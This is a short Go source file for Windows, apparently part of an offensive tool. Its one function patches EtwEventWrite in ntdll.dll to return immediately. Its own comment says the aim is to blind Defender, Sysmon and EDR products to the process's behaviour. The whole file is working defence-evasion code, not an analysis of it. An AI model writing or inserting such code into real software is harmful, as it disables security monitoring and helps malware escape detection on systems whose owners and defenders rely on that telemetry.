//go:build windows

package main

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	ntdllbp          = windows.NewLazySystemDLL("ntdll.dll")
	procEtwEventWrite = ntdllbp.NewProc("EtwEventWrite")
)

// patchETW patches EtwEventWrite in ntdll to a no-op (XOR EAX,EAX; RET).
// This silences all ETW telemetry from our process — Defender, Sysmon, and
// EDR consumers stop receiving behavioral events from us.
func patchETW() {
	if err := procEtwEventWrite.Find(); err != nil {
		return
	}
	addr := procEtwEventWrite.Addr()
	if addr == 0 {
		return
	}
	patch := []byte{0x31, 0xC0, 0xC3} // XOR EAX,EAX; RET
	var old uint32
	if err := windows.VirtualProtect(addr, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &old); err != nil {
		return
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch))
	copy(dst, patch)
	windows.VirtualProtect(addr, uintptr(len(patch)), old, &old)
}
